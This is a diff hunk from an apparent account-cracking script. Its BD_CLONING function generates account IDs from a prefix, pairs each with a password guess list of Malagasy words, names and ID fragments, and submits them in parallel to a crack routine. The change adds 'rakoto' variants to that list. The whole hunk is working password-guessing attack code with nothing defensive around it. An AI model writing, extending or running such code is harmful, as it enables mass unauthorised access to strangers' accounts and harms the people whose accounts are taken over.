@@ -113,7 +113,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:8],ids[:7],ids[6:],ids[5:],'malala','Malala','fitiavana','mamako', 'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'badoda', 'mendrika', 'mendrika','antananarivo', 'marary', 'marary', 'milely', 'milely','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy','nantenaina','Nantenaina','safidy','miora','miora','Miora','fuckyou','free fire','Free Fire','analamanga','Analamanga','natacha','Natacha','lalaina','Lalaina','lalaina','diamondra','Diamondra','mamisoa','Mamisoa','mampionona','Mampionona','nomena' 'nomena','Nomena','miangaly','miangaly','Miangaly']
+            passlist=[psx,ids,ids[:8],ids[:7],ids[6:],ids[5:],'malala','Malala','fitiavana','mamako', 'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'badoda', 'mendrika', 'mendrika','antananarivo', 'marary', 'marary', 'milely', 'milely','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy','nantenaina','Nantenaina','safidy','miora','miora','Miora','fuckyou','free fire','rakoto','analamanga','Rakoto','rakoto','natacha','Natacha','lalaina','Lalaina','lalaina','diamondra','Diamondra','mamisoa','Mamisoa','mampionona','Mampionona','nomena' 'nomena','Nomena','miangaly','miangaly','Miangaly']
             Dipto.submit(method_crack,ids,passlist)
     linex()
     print(' LE CLONING EST FINI ')
